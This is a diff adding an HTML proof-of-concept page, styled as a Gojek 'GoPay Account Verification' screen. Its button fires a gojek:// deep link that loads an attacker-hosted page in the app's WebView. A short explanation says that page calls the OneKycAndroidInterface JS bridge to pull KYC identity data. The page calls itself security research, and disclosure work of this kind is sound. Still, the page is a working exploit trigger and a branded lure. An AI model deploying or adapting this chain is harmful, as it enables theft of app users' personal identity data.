@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoPay Verification</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
+        .card { background: white; border-radius: 12px; padding: 24px; max-width: 400px; margin: 40px auto; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo span { font-size: 24px; font-weight: bold; color: #00aa13; }
+        h2 { color: #333; text-align: center; margin-bottom: 8px; }
+        p { color: #666; text-align: center; font-size: 14px; line-height: 1.5; }
+        .btn { display: block; width: 100%; padding: 14px; background: #00aa13; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; text-decoration: none; margin-top: 20px; box-sizing: border-box; }
+        .result { margin-top: 20px; padding: 12px; background: #f0f0f0; border-radius: 8px; font-family: monospace; font-size: 12px; word-break: break-all; display: none; }
+        .status { text-align: center; margin-top: 12px; font-size: 13px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo"><span>gojek</span></div>
+        <h2>Account Verification</h2>
+        <p>Tap below to verify your GoPay account status. This is a security research proof-of-concept.</p>
+        
+        <a class="btn" id="triggerBtn" href="gojek://gocore/web?url=https://n4igme.github.io/randscript/gojek-poc-bridge.html&title=Verify+Account">
+            Open in Gojek WebView
+        </a>
+        
+        <div class="status" id="status">This page triggers the deep link → WebView → JS bridge chain</div>
+    </div>
+
+    <div class="card" style="margin-top: 16px;">
+        <h2 style="font-size: 16px;">How it works</h2>
+        <p style="text-align: left; font-size: 13px;">
+            1. Tap the button above<br>
+            2. Gojek app opens with attacker-controlled URL in WebView<br>
+            3. The loaded page (gojek-poc-bridge.html) accesses OneKycAndroidInterface<br>
+            4. JS bridge methods are called to extract KYC data
+        </p>
+    </div>
+</body>
+</html>
